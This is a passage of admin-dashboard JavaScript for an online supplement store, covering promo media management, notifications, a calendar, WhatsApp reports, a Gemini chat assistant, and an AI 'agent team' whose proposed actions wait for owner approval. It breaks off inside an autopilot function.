  const key = 'promo.card.' + n + '.alt';
  try {
    if (!value.trim()) {
      await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'DELETE' }).catch(() => {});
    } else {
      await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'PUT', body: JSON.stringify({ url: value.trim() }) });
    }
    toast('✅ Saved');
    loadPromoMedia();
  } catch(e) { toast('Could not save: ' + e.message, 'error'); }
}
async function deletePromoCard(n) {
  const key = 'promo.card.' + n;
  if (!confirm('Remove promo card #' + n + ' (its image is also deleted from storage)? This can\'t be undone.')) return;
  try {
    const row = (_siteMediaAll || []).find(x => x.key === key);
    if (row && row.url) {
      const filename = String(row.url).split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, { method: 'DELETE' }).catch(() => {});
    }
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'DELETE' }).catch(() => {});
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key + '.alt')}`, { method: 'DELETE' }).catch(() => {});
    toast('🗑️ Promo card removed');
    loadBannerManagers(); loadPromoMedia();
  } catch(e) { toast('Could not delete: ' + e.message, 'error'); }
}
// ═══════════════════════════════════════════════
// PROMO MEDIA STRIP — the infinite scrolling marquee on the home
// page (below the Offers carousel). Managed through the
// /api/admin/promo-media endpoints (promo_media table). Cards can be
// reordered and toggled active/inactive; the storefront serves every
// card through the Cloudflare CDN (/cdn-storage/) with auto-compression.
async function loadPromoStripMedia() {
  try {
    const r = await apiFetch('/api/admin/promo-media');
    const d = await r.json();
    _promoStripAll = d.data || [];
  } catch(e) { _promoStripAll = _promoStripAll || []; }
  renderPromoStripGrid();
}
function renderPromoStripGrid() {
  const cards = (_promoStripAll || []).map((c, i) => {
    const url = c.src || '';
    const isVid = isVideoFileUrl(url);
    const pos = i + 1;
    const cta = (c.cta_page || 'shop').charAt(0).toUpperCase() + (c.cta_page || 'shop').slice(1);
    return `
    <div class="card" style="opacity:${c.active ? '1' : '0.55'};">
      ${url
        ? (isVid
            ? '<video src="'+adminCdnImg(url)+'" muted loop playsinline preload="metadata" autoplay class="banner-preview" style="object-fit:cover;"></video><span class="img-slot-vid-badge">▶ VIDEO</span>'
            : '<img src="'+adminCdnImg(url)+'" class="banner-preview" onerror="this.style.display=\'none\'">')
        : '<div class="banner-preview" style="background:var(--surface2);display:flex;align-items:center;justify-content:center;color:var(--text3);font-size:0.66rem;">No media</div>'}
      <div style="padding:6px 9px;">
        <div style="display:flex;align-items:center;justify-content:space-between;">
          <span style="font-size:0.72rem;font-weight:600;">Home promo strip #${pos} → ${cta}</span>
          <div style="display:flex;gap:4px;">
            ${i > 0 ? '<button class="btn btn-secondary btn-sm btn-icon" onclick="movePromoStripCard(\''+c.id+'\',-1)" title="Move earlier">◀</button>' : ''}
            ${i < (_promoStripAll||[]).length - 1 ? '<button class="btn btn-secondary btn-sm btn-icon" onclick="movePromoStripCard(\''+c.id+'\',1)" title="Move later">▶</button>' : ''}
            <button class="btn btn-secondary btn-sm btn-icon" onclick="togglePromoStripCard('${c.id}',${c.active ? 'false' : 'true'})" title="${c.active ? 'Hide' : 'Show'} this card">${c.active ? '👁️' : '🚫'}</button>
            <button class="btn btn-danger btn-sm btn-icon" onclick="deletePromoStripCard('${c.id}')" title="Remove this card">🗑️</button>
          </div>
        </div>
        <div class="siteimg-usage"><b>Appears on:</b> homepage scrolling promo strip below the hero<br><span>Recommended: square 1400×1400px or short video · Destination: ${cta}</span></div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:10px;">
          <select class="form-control" style="font-size:0.78rem;" onchange="setPromoStripField('${c.id}','type',this.value)">
            <option value="image"${(c.type||'image')==='image'?' selected':''}>Image</option>
            <option value="video"${c.type==='video'?' selected':''}>Video</option>
          </select>
          <select class="form-control" style="font-size:0.78rem;" onchange="setPromoStripField('${c.id}','cta_page',this.value)">
            <option value="shop"${(c.cta_page||'shop')==='shop'?' selected':''}>→ Shop (default)</option>
            <option value="home"${c.cta_page==='home'?' selected':''}>→ Home</option>
            <option value="about"${c.cta_page==='about'?' selected':''}>→ About</option>
            <option value="contact"${c.cta_page==='contact'?' selected':''}>→ Contact</option>
          </select>
        </div>
        <div style="display:flex;gap:6px;">
          <input type="file" accept="image/*,.webp,.svg,video/*,.mp4,.webm,.mov" id="promoStripFile-${c.id}" style="display:none;" onchange="uploadPromoStripCard('${c.id}',this)">
          <button class="btn btn-primary btn-sm" style="flex:1;" onclick="document.getElementById('promoStripFile-${c.id}').click()">📤 ${url ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
        </div>
      </div>
    </div>`;
  }).join('');
  document.getElementById('promoStripGrid').innerHTML = cards || emptyMsg('No strip cards yet — click “＋ Add Strip Card” and the marquee appears on the home page instantly.');
}
async function addPromoStripCard() {
  const inp = document.createElement('input');
  inp.type = 'file'; inp.accept = 'image/*,.webp,.svg,video/*,.mp4,.webm,.mov';
  inp.onchange = () => createPromoStripCard(inp.files[0]);
  inp.click();
}
async function createPromoStripCard(file) {
  if (!file) return;
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this promo-card media upload?');
    const d = await r.json();
    if (!r.ok) { toast(d.error || 'Upload failed', 'error'); return; }
    const url = d.url || d.public_url || '';
    await apiFetch('/api/admin/promo-media', {
      method: 'POST',
      body: JSON.stringify({ src: url, type: file.type.startsWith('video/') ? 'video' : 'image', cta_page: 'shop' })
    });
    toast('✅ ' + (file.type.startsWith('video/') ? 'Video' : 'Image') + ' added to the promo strip — live on the home page now');
    loadPromoStripMedia();
  } catch(e) { toast('Could not add card: ' + e.message, 'error'); }
}
async function uploadPromoStripCard(id, input) {
  const file = input.files[0]; if (!file) return;
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this promo-card media upload?');
    const d = await r.json();
    if (!r.ok) { toast(d.error || 'Upload failed', 'error'); return; }
    const url = d.url || d.public_url || '';
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(id)}`, {
      method: 'PUT',
      body: JSON.stringify({ src: url, type: file.type.startsWith('video/') ? 'video' : 'image' })
    });
    toast('✅ ' + (file.type.startsWith('video/') ? 'Video' : 'Image') + ' uploaded — live on the home page now');
    loadPromoStripMedia();
  } catch(e) { toast('Upload error: ' + e.message, 'error'); }
}
async function setPromoStripField(id, field, value) {
  try {
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(id)}`, { method: 'PUT', body: JSON.stringify({ [field]: value }) });
    toast('✅ Saved');
    loadPromoStripMedia();
  } catch(e) { toast('Could not save: ' + e.message, 'error'); }
}
async function togglePromoStripCard(id, active) {
  try {
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(id)}`, { method: 'PUT', body: JSON.stringify({ active }) });
    toast(active ? '👁️ Card is now visible on the home page' : '🚫 Card hidden from the home page');
    loadPromoStripMedia();
  } catch(e) { toast('Could not update: ' + e.message, 'error'); }
}
async function movePromoStripCard(id, dir) {
  const all = _promoStripAll || [];
  const idx = all.findIndex(c => c.id === id);
  const swapIdx = idx + dir;
  if (idx < 0 || swapIdx < 0 || swapIdx >= all.length) return;
  const [a, b] = [all[idx].sort_order, all[swapIdx].sort_order];
  try {
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(id)}`, { method: 'PUT', body: JSON.stringify({ sort_order: b }) });
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(all[swapIdx].id)}`, { method: 'PUT', body: JSON.stringify({ sort_order: a }) });
    loadPromoStripMedia();
  } catch(e) { toast('Could not reorder: ' + e.message, 'error'); }
}
async function deletePromoStripCard(id) {
  const row = (_promoStripAll || []).find(c => c.id === id);
  if (!confirm('Remove this promo strip card (its image is also deleted from storage)? This can\'t be undone.')) return;
  try {
    if (row && row.src) {
      const filename = String(row.src).split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, { method: 'DELETE' }).catch(() => {});
    }
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(id)}`, { method: 'DELETE' });
    toast('🗑️ Strip card removed');
    loadPromoStripMedia();
  } catch(e) { toast('Could not delete: ' + e.message, 'error'); }
}
// ═══════════════════════════════════════════════
// NOTIFICATION CENTER
// Built from data already loaded elsewhere (allOrders, allProducts,
// allCustomers) — no new backend endpoint required. "Read" state is
// tracked client-side in localStorage per notification id.
// ═══════════════════════════════════════════════
function _notifReadIds() {
  try { return new Set(JSON.parse(localStorage.getItem('ascovita_notif_read')||'[]')); }
  catch(e) { return new Set(); }
}
function _notifSaveRead(set) {
  localStorage.setItem('ascovita_notif_read', JSON.stringify([...set]));
}
function _notifTimeAgo(iso) {
  if(!iso) return '';
  const diff = Date.now() - new Date(iso).getTime();
  const m = Math.round(diff/60000);
  if(m < 1) return 'just now';
  if(m < 60) return m+'m ago';
  const h = Math.round(m/60);
  if(h < 24) return h+'h ago';
  return Math.round(h/24)+'d ago';
}
function buildNotifications() {
  const items = [];
  const cutoff = Date.now() - 48*3600*1000; // look back 48h for activity-based alerts
  (allOrders||[]).forEach(o => {
    const t = new Date(o.created_at||0).getTime();
    if(t >= cutoff) {
      items.push({id:'order-'+o.id, ico:'🛒', color:'rgba(32,128,232,0.15)', title:'New order '+o.id, sub:(o.customer_name||'Customer')+' · ₹'+(o.total||0), time:o.created_at});
      const ps = (o.payment_status||'').toLowerCase();
      if(ps.includes('paid') || ps==='success') items.push({id:'paid-'+o.id, ico:'💰', color:'rgba(74,138,40,0.15)', title:'Payment received — '+o.id, sub:(o.payment_method||'')+' · ₹'+(o.total||0), time:o.created_at});
      const st = (o.status||o.fulfillment||'').toLowerCase();
      if(st.includes('ship') || st.includes('dispatch')) items.push({id:'ship-'+o.id, ico:'🚚', color:'rgba(196,146,14,0.15)', title:'Shipment dispatched — '+o.id, sub:o.shiprocket_id?('Tracking: '+o.shiprocket_id):'On the way', time:o.created_at});
    }
  });
  (allProducts||[]).filter(p=>!p.deleted_at && (p.stock||0) < 20).forEach(p => {
    items.push({id:'lowstock-'+p.id, ico:'⚠️', color:'var(--red-soft)', title:'Low stock: '+p.name, sub:(p.stock||0)+' units left', time:null});
  });
  (allCustomers||[]).forEach(c => {
    const t = new Date(c.created_at||0).getTime();
    if(t >= cutoff) items.push({id:'cust-'+(c.id||c.email||c.phone), ico:'✨', color:'rgba(74,138,40,0.15)', title:'New customer: '+(c.name||c.email||'Unknown'), sub:c.email||c.phone||'', time:c.created_at});
  });
  items.sort((a,b) => new Date(b.time||0) - new Date(a.time||0));
  return items.slice(0, 40);
}
function refreshNotifications() {
  const items = buildNotifications();
  const read = _notifReadIds();
  const unread = items.filter(i => !read.has(i.id));
  const countEl = document.getElementById('notifCount');
  if(countEl) { countEl.textContent = unread.length > 9 ? '9+' : unread.length; countEl.style.display = unread.length ? 'flex' : 'none'; }
  const list = document.getElementById('notifList');
  if(!list) return;
  list.innerHTML = items.length ? items.map(i => `
    <div class="notif-item ${read.has(i.id)?'':'unread'}" onclick="markNotifRead('${i.id}')">
      <div class="notif-ico" style="background:${i.color}">${i.ico}</div>
      <div class="notif-body">
        <div class="notif-title">${i.title}</div>
        <div class="notif-sub">${i.sub}</div>
        ${i.time?`<div class="notif-time">${_notifTimeAgo(i.time)}</div>`:''}
      </div>
    </div>
  `).join('') : '<div class="notif-empty">No notifications yet</div>';
}
function markNotifRead(id) {
  const read = _notifReadIds(); read.add(id); _notifSaveRead(read); refreshNotifications();
}
function markAllNotifsRead() {
  const read = _notifReadIds();
  buildNotifications().forEach(i => read.add(i.id));
  _notifSaveRead(read); refreshNotifications();
}
function toggleNotifDropdown() {
  document.getElementById('notifDropdown').classList.toggle('open');
}
document.addEventListener('click', e => {
  const wrap = document.querySelector('.notif-wrap');
  if(wrap && !wrap.contains(e.target)) document.getElementById('notifDropdown')?.classList.remove('open');
});

// ═══════════════════════════════════════════════
// CALENDAR
// Order-placed markers come from allOrders (already loaded).
// Delivery dates / manufacturing deadlines / team reminders are
// user-added events, stored locally for now — promote to a real
// `calendar_events` table + API once the backend is ready.
// ═══════════════════════════════════════════════
let calViewDate = new Date();
function _calEvents() {
  try { return JSON.parse(localStorage.getItem('ascovita_calendar_events')||'[]'); }
  catch(e) { return []; }
}
function _calSaveEvents(list) { localStorage.setItem('ascovita_calendar_events', JSON.stringify(list)); }
function _calDateKey(d) { return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0'); }

function calChangeMonth(delta) { calViewDate.setMonth(calViewDate.getMonth()+delta); renderCalendar(); }
function calGoToday() { calViewDate = new Date(); renderCalendar(); }

function renderCalendar() {
  const grid = document.getElementById('calGrid');
  if(!grid) return;
  const year = calViewDate.getFullYear(), month = calViewDate.getMonth();
  document.getElementById('calMonthLabel').textContent = calViewDate.toLocaleDateString('en-IN',{month:'long',year:'numeric'});

  const events = _calEvents();
  const ordersByDay = {};
  (allOrders||[]).forEach(o => {
    if(!o.created_at) return;
    const k = _calDateKey(new Date(o.created_at));
    ordersByDay[k] = (ordersByDay[k]||0) + 1;
  });

  const firstOfMonth = new Date(year, month, 1);
  const startDow = firstOfMonth.getDay();
  const daysInMonth = new Date(year, month+1, 0).getDate();
  const todayKey = _calDateKey(new Date());

  let cells = [];
  for(let i=0; i<startDow; i++) {
    const d = new Date(year, month, 1-(startDow-i));
    cells.push({date:d, otherMonth:true});
  }
  for(let d=1; d<=daysInMonth; d++) cells.push({date:new Date(year,month,d), otherMonth:false});
  while(cells.length % 7 !== 0 || cells.length < 35) cells.push({date:new Date(year, month, daysInMonth + (cells.length - startDow - daysInMonth) + 1), otherMonth:true});

  grid.innerHTML = cells.map(c => {
    const key = _calDateKey(c.date);
    const dayEvents = events.filter(e => e.date === key);
    const orderCount = ordersByDay[key];
    let evtHtml = dayEvents.slice(0,2).map(e => `<div class="cal-evt ${e.type}" title="${e.title}" onclick="event.stopPropagation();openCalEventModal('${e.id}')">${e.title}</div>`).join('');
    if(orderCount) evtHtml += `<div class="cal-evt order">${orderCount} order${orderCount>1?'s':''}</div>`;
    if(dayEvents.length > 2) evtHtml += `<div class="cal-evt-more">+${dayEvents.length-2} more</div>`;
    return `<div class="cal-cell ${c.otherMonth?'other-month':''} ${key===todayKey?'today':''}" onclick="openCalEventModal(null,'${key}')">
      <div class="cal-daynum">${c.date.getDate()}</div>${evtHtml}
    </div>`;
  }).join('');

  // Upcoming list (next 14 days)
  const now = new Date(); now.setHours(0,0,0,0);
  const horizon = new Date(now); horizon.setDate(horizon.getDate()+14);
  const upcoming = events.filter(e => { const d = new Date(e.date); return d >= now && d <= horizon; })
    .sort((a,b)=> new Date(a.date)-new Date(b.date));
  const upcomingEl = document.getElementById('calUpcomingList');
  if(upcomingEl) {
    upcomingEl.innerHTML = upcoming.length ? upcoming.map(e => `
      <div class="tl-item">
        <div class="tl-dot" style="background:${e.type==='delivery'?'rgba(32,128,232,0.18)':e.type==='manufacturing'?'rgba(196,146,14,0.18)':'rgba(74,138,40,0.18)'}">${e.type==='delivery'?'🚚':e.type==='manufacturing'?'🏭':'📌'}</div>
        <div class="tl-content" style="cursor:pointer;" onclick="openCalEventModal('${e.id}')">
          <div class="tl-title">${e.title}</div>
          <div class="tl-time">${new Date(e.date).toLocaleDateString('en-IN',{weekday:'short',day:'numeric',month:'short'})}${e.notes?' · '+e.notes:''}</div>
        </div>
      </div>
    `).join('') : '<div class="empty-state">No upcoming events</div>';
  }
}

function openCalEventModal(id, presetDate) {
  const ev = id ? _calEvents().find(e => e.id === id) : null;
  document.getElementById('calEventModalTitle').textContent = ev ? 'Edit Event' : 'Add Event';
  document.getElementById('calEventId').value = ev ? ev.id : '';
  document.getElementById('calEventTitle').value = ev ? ev.title : '';
  document.getElementById('calEventDate').value = ev ? ev.date : (presetDate || _calDateKey(new Date()));
  document.getElementById('calEventType').value = ev ? ev.type : 'reminder';
  document.getElementById('calEventNotes').value = ev ? (ev.notes||'') : '';
  document.getElementById('calEventDeleteBtn').style.display = ev ? 'inline-flex' : 'none';
  openModal('calEventModal');
}
function saveCalEvent() {
  const title = document.getElementById('calEventTitle').value.trim();
  if(!title) { toast('Title is required','error'); return; }
  const date = document.getElementById('calEventDate').value;
  if(!date) { toast('Date is required','error'); return; }
  const id = document.getElementById('calEventId').value;
  let events = _calEvents();
  if(id) {
    events = events.map(e => e.id === id ? {...e, title, date, type:document.getElementById('calEventType').value, notes:document.getElementById('calEventNotes').value} : e);
  } else {
    events.push({id:'ev-'+Date.now(), title, date, type:document.getElementById('calEventType').value, notes:document.getElementById('calEventNotes').value});
  }
  _calSaveEvents(events);
  closeModal('calEventModal');
  toast('Event saved ✅');
  renderCalendar();
}
function deleteCalEvent() {
  const id = document.getElementById('calEventId').value;
  if(!id || !confirm('Delete this event?')) return;
  _calSaveEvents(_calEvents().filter(e => e.id !== id));
  closeModal('calEventModal');
  toast('Event deleted');
  renderCalendar();
}

// ═══════════════════════════════════════════════
// WHATSAPP
// ═══════════════════════════════════════════════
async function loadWhatsAppPreview() {
  document.getElementById('waPreview').textContent = 'Loading preview…';
  try {
    const r = await apiFetch('/api/admin/whatsapp/preview');
    const d = await r.json();
    document.getElementById('waPreview').textContent = d.report || 'No data';
  } catch(e) { document.getElementById('waPreview').textContent = '⚠️ Could not load preview: '+e.message; }
}

async function sendWhatsApp() {
  try {
    const r = await apiFetch('/api/admin/whatsapp/send-report',{method:'POST'});
    const d = await r.json();
    if(!r.ok) throw new Error(d.error||'Failed');
    toast('WhatsApp report sent! ✅');
  } catch(e) { toast(e.message,'error'); }
}

async function sendCustomWhatsApp() {
  const msg = document.getElementById('waCustomMsg').value.trim();
  if(!msg) { toast('Enter a message','error'); return; }
  try {
    const r = await apiFetch('/api/admin/whatsapp/send-report',{method:'POST',body:JSON.stringify({message:msg})});
    const d = await r.json();
    if(!r.ok) throw new Error(d.error||'Failed');
    toast('Alert sent! ✅'); document.getElementById('waCustomMsg').value='';
  } catch(e) { toast(e.message,'error'); }
}

// ═══════════════════════════════════════════════
// AI ASSISTANT
// ═══════════════════════════════════════════════
let chatHistory = [];

async function sendAiMsg() {
  const input = document.getElementById('aiInput');
  const msg   = input.value.trim(); if(!msg) return;
  input.value = '';

  appendChatMsg(msg, 'user');
  chatHistory.push({role:'user', content:msg});

  const typingId = 'typing_'+Date.now();
  const tyDiv = document.createElement('div');
  tyDiv.className='ai-msg ai'; tyDiv.id=typingId;
  tyDiv.innerHTML=`<div class="ai-avatar">🤖</div><div class="ai-bubble"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div>`;
  document.getElementById('chatMessages').appendChild(tyDiv);
  document.getElementById('chatMessages').scrollTop = 999999;

  const statsSnap = {
    totalOrders: allOrders.length,
    totalRevenue: allOrders.filter(o=>o.payment_status==='Paid').reduce((s,o)=>s+parseFloat(o.total||0),0),
    totalProducts: allProducts.length,
    totalCustomers: allCustomers.length,
    pendingOrders: allOrders.filter(o=>!(o.status||o.fulfillment)||(o.status||o.fulfillment)==='Pending').length,
    lowStock: allProducts.filter(p=>!p.deleted_at&&p.stock<20).length,
  };

  try {
    const systemPrompt = `You are the AI business assistant for Ozylix, an Indian health supplement company based in Anand, Gujarat. You help the admin manage the store.

Current business data:
- Total Orders: ${statsSnap.totalOrders}
- Revenue (Online): ₹${fmtNum(statsSnap.totalRevenue)}
- Products: ${statsSnap.totalProducts}
- Customers: ${statsSnap.totalCustomers}
- Pending Orders: ${statsSnap.pendingOrders}
- Low Stock Products: ${statsSnap.lowStock}
- Backend: https://ascovitahealthcare-cell-github-io.onrender.com

Products: ${allProducts.slice(0,5).map(p=>p.name+'(₹'+p.price+')').join(', ')}

Be helpful, concise, and use ₹ for Indian currency. Provide actionable business insights.`;

    const response = await fetch(`${API}/api/gemini`, {
      method:'POST',
      headers:{'Content-Type':'application/json','Authorization':'Bearer '+authToken},
      body: JSON.stringify({
        system_instruction: { parts: [{ text: systemPrompt }] },
        contents: chatHistory.map(m=>({ role: m.role==='assistant'?'model':'user', parts:[{text:m.content}] })),
        generationConfig: { maxOutputTokens: 1000, temperature: 0.7 }
      }),
      signal: AbortSignal.timeout(25000),
    });
    const data = await response.json();
    const reply = data.candidates?.[0]?.content?.parts?.[0]?.text || data.error?.message || 'Sorry, I could not get a response.';
    chatHistory.push({role:'assistant', content:reply});
    document.getElementById(typingId)?.remove();
    appendChatMsg(reply, 'ai');
  } catch(e) {
    document.getElementById(typingId)?.remove();
    appendChatMsg('⚠️ AI unavailable: '+e.message, 'ai');
  }
}

function appendChatMsg(text, role) {
  const div = document.createElement('div');
  div.className = 'ai-msg '+role;
  div.innerHTML = `<div class="ai-avatar">${role==='ai'?'🤖':'👤'}</div><div class="ai-bubble">${text.replace(/\n/g,'<br>')}</div>`;
  document.getElementById('chatMessages').appendChild(div);
  document.getElementById('chatMessages').scrollTop = 999999;
}

function clearChat() {
  chatHistory = [];
  document.getElementById('chatMessages').innerHTML = `<div class="ai-msg ai"><div class="ai-avatar">🤖</div><div class="ai-bubble">Chat cleared. How can I help you?</div></div>`;
}

document.getElementById('aiInput').addEventListener('keydown', e => { if(e.key==='Enter') sendAiMsg(); });

// ═══════════════════════════════════════════════
// AI AGENT TEAM (owner-only — server enforces this on every call)
// ═══════════════════════════════════════════════
const AITEAM_AGENTS = [
  {id:'CEO',         name:'Aryan Shah',    role:'Chief Executive Officer',      emoji:'👔'},
  {id:'CFO',         name:'Priya Mehta',   role:'Chief Financial Officer',      emoji:'💹'},
  {id:'CMO',         name:'Sneha Patel',   role:'Chief Marketing Officer',      emoji:'📣'},
  {id:'Marketing',   name:'Rahul Gupta',   role:'Marketing Manager',            emoji:'📊'},
  {id:'Social',      name:'Kavya Nair',    role:'Social Media Manager',         emoji:'📱'},
  {id:'Leads',       name:'Vikram Singh',  role:'Leads & Sales Manager',        emoji:'🎯'},
  {id:'Partnership', name:'Ankit Sharma',  role:'Partnership Manager',          emoji:'🤝'},
  {id:'Research',    name:'Dr. Aditi Roy', role:'Research & Expansion Manager', emoji:'🔬'},
  {id:'Customer',    name:'Meera Joshi',   role:'Customer Engagement Manager',  emoji:'💚'},
  {id:'COO',         name:'Rohan Das',     role:'Chief Operating Officer',      emoji:'⚙️'},
  {id:'CTO',         name:'Zara Khan',     role:'Chief Technology Officer',     emoji:'💻'},
];
let aiteamAutopilotTimer = null;

function aiteamAgentById(id) { return AITEAM_AGENTS.find(a => a.id === id); }

function loadAITeamPage() {
  const roster = document.getElementById('aiteamRoster');
  if (roster) {
    roster.innerHTML = AITEAM_AGENTS.map(a => `
      <div style="display:flex;align-items:center;gap:8px;padding:7px 8px;border-radius:8px;cursor:pointer;" onclick="document.getElementById('aiteamAgentSelect').value='${a.id}'" onmouseover="this.style.background='var(--surface2)'" onmouseout="this.style.background='transparent'">
        <span style="font-size:1.1rem;">${a.emoji}</span>
        <div style="min-width:0;">
          <div style="font-size:0.8rem;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${a.name}</div>
          <div style="font-size:0.68rem;color:var(--text3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${a.role}</div>
        </div>
      </div>`).join('');
  }
  const sel = document.getElementById('aiteamAgentSelect');
  if (sel && !sel.dataset.filled) {
    sel.innerHTML = AITEAM_AGENTS.map(a => `<option value="${a.id}">${a.emoji} ${a.name} — ${a.role}</option>`).join('');
    sel.dataset.filled = '1';
  }
  loadPendingActions();
}

function aiteamFeedCard(agentId, html, tag) {
  const feed = document.getElementById('aiteamFeed');
  if (!feed) return;
  if (feed.dataset.empty !== 'false') { feed.innerHTML = ''; feed.dataset.empty = 'false'; }
  const a = aiteamAgentById(agentId) || {emoji:'🤖', name: agentId};
  const card = document.createElement('div');
  card.style.cssText = 'padding:10px 12px;border-bottom:1px solid var(--border);font-size:0.84rem;line-height:1.6;';
  card.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:4px;gap:10px;">
      <strong style="color:var(--green-text);">${a.emoji} ${a.name}</strong>
      <span style="font-size:0.68rem;color:var(--text3);white-space:nowrap;">${tag||''} ${new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'})}</span>
    </div>
    <div>${html}</div>`;
  feed.insertBefore(card, feed.firstChild);
}

async function askAgent() {
  const agentId = document.getElementById('aiteamAgentSelect').value;
  const input   = document.getElementById('aiteamTaskInput');
  const task    = input.value.trim();
  if (!task) return;
  input.value = '';
  aiteamFeedCard(agentId, '<span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span>', 'thinking…');
  try {
    const r = await fetch(`${API}/api/owner/ai/ask`, {
      method:'POST',
      headers:{'Content-Type':'application/json','Authorization':'Bearer '+authToken},
      body: JSON.stringify({ agentId, task }),
    });
    const d = await r.json().catch(() => ({}));
    document.getElementById('aiteamFeed').firstChild?.remove();
    const err = (typeof d.error === 'string') ? d.error : (d.error && d.error.message) || '';
    if (!r.ok) aiteamFeedCard(agentId, '⚠️ AI service error (HTTP ' + r.status + ') — ' + (err || 'see console'));
    else if (err) aiteamFeedCard(agentId, '⚠️ ' + err);
    else aiteamFeedCard(agentId, (typeof d.response === 'string' ? d.response : '').replace(/\n/g,'<br>'));
  } catch(e) {
    document.getElementById('aiteamFeed').firstChild?.remove();
    aiteamFeedCard(agentId, '⚠️ Network error: '+e.message);
  }
}

async function runTeamMeeting() {
  const order = ['CFO','CMO','Leads','Partnership','Research','Customer','COO','CEO'];
  aiteamFeedCard('CEO', '<strong>📋 Weekly Sync started</strong> — collecting updates from the team…', 'meeting');
  for (const id of order) {
    const prompt = id === 'CEO'
      ? 'Give your CEO synthesis from the team updates so far this session: top 3 priorities and one decision you are making right now.'
      : 'Give a 30-second update: one win, one challenge, one ask — specific to Ozylix and grounded in real numbers if you have them.';
    try {
      const r = await fetch(`${API}/api/owner/ai/ask`, {
        method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+authToken},
        body: JSON.stringify({ agentId:id, task:prompt }),
      });
      const d = await r.json();
      aiteamFeedCard(id, (d.response||d.error||'').replace(/\n/g,'<br>'), id==='CEO'?'synthesis':'weekly sync');
    } catch(e) { aiteamFeedCard(id, '⚠️ '+e.message); }
    await new Promise(res => setTimeout(res, 500));
  }
}

async function proposeAction() {
  const agentId = document.getElementById('aiteamAgentSelect').value;
  const input   = document.getElementById('aiteamActionInput');
  const instruction = input.value.trim();
  if (!instruction) return;
  input.value = '';
  aiteamFeedCard(agentId, '⚡ Drafting an action proposal…', 'drafting');
  try {
    const r = await fetch(`${API}/api/owner/ai/propose-action`, {
      method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+authToken},
      body: JSON.stringify({ agentId, instruction }),
    });
    const d = await r.json().catch(() => ({}));
    document.getElementById('aiteamFeed').firstChild?.remove();
    const err = (typeof d.error === 'string') ? d.error : (d.error && d.error.message) || '';
    if (!r.ok) { aiteamFeedCard(agentId, '⚠️ AI service error (HTTP ' + r.status + ') — ' + (err || 'see console')); return; }
    if (err) { aiteamFeedCard(agentId, '⚠️ ' + err); return; }
    aiteamFeedCard(agentId, `Drafted action: <strong>${(d.action_type||'').replace(/_/g,' ')}</strong> — ${d.summary||''}<br><span style="color:var(--gold-text);font-size:0.75rem;">→ See Pending Actions below to approve.</span>`);
    loadPendingActions();
  } catch(e) {
    document.getElementById('aiteamFeed').firstChild?.remove();
    aiteamFeedCard(agentId, '⚠️ Network error: '+e.message);
  }
}

async function loadPendingActions() {
  const box = document.getElementById('aiteamActions');
  if (!box) return;
  try {
    const r = await fetch(`${API}/api/owner/ai/actions?status=pending`, { headers:{'Authorization':'Bearer '+authToken} });
    const d = await r.json();
    const rows = d.data || [];
    if (!rows.length) { box.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:14px;">No pending actions.</div>'; return; }
    box.innerHTML = rows.map(a => `
      <div style="border:1px solid var(--border2);border-radius:10px;padding:10px 12px;">
        <div style="font-size:0.68rem;color:var(--gold-text);font-weight:700;letter-spacing:0.5px;">${(a.action_type||'').toUpperCase().replace(/_/g,' ')}</div>
        <div style="font-size:0.82rem;color:var(--text);margin-top:2px;">${a.summary || ''}</div>
        <div style="font-size:0.68rem;color:var(--text3);margin-top:4px;">by ${a.agent_name||a.agent_id} · ${new Date(a.created_at).toLocaleString('en-IN')}</div>
        <div style="display:flex;gap:8px;margin-top:10px;">
          <button class="btn btn-primary btn-sm" onclick="decideAction('${a.id}','approve')">✓ Approve & Execute</button>
          <button class="btn btn-secondary btn-sm" onclick="decideAction('${a.id}','reject')">✕ Reject</button>
        </div>
      </div>`).join('');
  } catch(e) { box.innerHTML = `<div style="color:var(--red);font-size:0.8rem;">Failed to load: ${e.message}</div>`; }
}

async function decideAction(id, decision) {
  try {
    const r = await apiFetch(`/api/owner/ai/actions/${id}/${decision}`, { method:'POST' });
    const d = await r.json();
    if (d.error) toast('⚠️ '+d.error); else toast(decision==='approve' ? '✅ Action executed' : 'Action rejected');
    loadPendingActions();
  } catch(e) { toast('⚠️ '+e.message); }
}

function toggleAutopilot() {
  const on = document.getElementById('aiteamAutopilot').checked;
  clearTimeout(aiteamAutopilotTimer);
  if (!on) return;
  const tick = async () => {
    const a = AITEAM_AGENTS[Math.floor(Math.random()*AITEAM_AGENTS.length)];
    try {
      const r = await fetch(`${API}/api/owner/ai/ask`, {
        method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+authToken},
        body: JSON.stringify({ agentId:a.id, task:'Give a brief unprompted status update or one suggestion for your area right now — keep it short.' }),
      });
      const d = await r.json().catch(() => ({}));
